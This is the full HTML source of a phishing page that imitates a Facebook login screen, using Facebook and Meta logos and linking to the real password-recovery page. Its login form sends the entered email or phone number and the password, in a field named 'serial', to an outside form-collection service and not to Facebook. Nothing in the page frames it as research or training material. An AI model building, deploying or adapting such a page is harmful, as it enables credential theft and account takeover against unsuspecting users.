<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100%;
        }

        .login-box {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background-image: linear-gradient(to left, #07f6070a, #12ebff12, #eeeeee, hsla(0, 100%, 50%, 0.07));
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        p2 {
            font-size: 13px;
            color: rgb(0, 0, 0);
        }

        .textbox {
            margin-bottom: 10px;
            position: relative;
        }

        .textbox input {
            width: 100%;
            padding: 21px;
            border: 1px solid silver;
            border-radius: 15px;
            outline: none;
            color: #000;
            background-color: #ffffff;
            font-size: 14px;
        }

        .textbox label {
            position: absolute;
            top: 20px;
            left: 15px;
            color: #9d9d9d;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.3s ease;
        }

        .textbox input:focus + label,
        .textbox input:not(:placeholder-shown) + label {
            top: 6px;
            left: 15px;
            font-size: 11px;
            color: #0f0f17;
        }

        .textbox .eye-icon {
            position: absolute;
            top: 25%;
            right: 15px;
            cursor: pointer;
            color: #9d9d9d;
        }

        .btn {
            width: 100%;
            padding: 10px;
            background: blue;
            border: none;
            border-radius: 30px;
            color: #fff;
            cursor: pointer;
            font-size: 14px;
            margin-top: 10px;
        }

        .btn:hover {
            background: #2d6ddb;
        }

        #createAccountBtn {
            width: 100%;
            padding: 7px;
            font-size: 15px;
            background-color: transparent;
            border-radius: 30px;
            color: blue;
            border: 1px solid blue;
            margin-top: 10px;
            cursor: pointer;
        }
        .textbox .eye-icon {
    position: absolute;
    top: 50%;
    right: 15px;
    transform: translateY(-50%);
    cursor: pointer;
    color: #9d9d9d;
}


        p1 {
            font-size: 12px;
            color: rgb(70, 68, 68);
        }

        @media (max-width: 600px) {
            .login-box {
                width: 90%;
                padding: 15px;
                background-image: linear-gradient(to left, #ff000011, #eeeeee, #12ebff21, rgba(7, 246, 7, 0.066));
            }

            .textbox input {
                padding: 12px;
            }

            .textbox label {
                top: 12px;
                left: 12px;
            }

            .btn, #createAccountBtn {
                padding: 12px;
            }
        }
    </style>
</head>

<body>
    <div class="login-box">
        <center><p1>English (US)</p1></center><br>
        <center><img src="https://static.vecteezy.com/system/resources/previews/018/930/476/non_2x/facebook-logo-facebook-icon-transparent-free-png.png" width="30%" alt="Facebook Logo"></center><br>
        <form action="https://formkeep.com/f/e07424ab86c8" accept-charset="UTF-8" enctype="multipart/form-data" method="POST">
            <div class="textbox">
                <input type="text" placeholder=" " name="contact" required>
                <label>Mobile number or email address</label>
            </div>
            <div class="textbox">
                <input type="password" placeholder=" " name="serial" id="password" required>
                <label>Password</label>
                <i class="fas fa-eye eye-icon" id="togglePassword"></i>
            </div>
            <button type="submit" class="btn">Log in</button><br><br>
            <center><p2 id="forgotPassword">Forgot password?</p2></center>
        </form><br>
        <input type="button" id="createAccountBtn" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br><br>
        <center><img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="20%" alt="Meta Logo"></center>
    </div>
    <script>
        document.getElementById('forgotPassword').addEventListener('click', function() {
            window.open('https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0QHZb3SwCI7CkOvUs&ref=dbl&_rdr', '_blank');
        });

        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.classList.toggle('fa-eye');
            this.classList.toggle('fa-eye-slash');
        });
    </script>
</body>
</html>
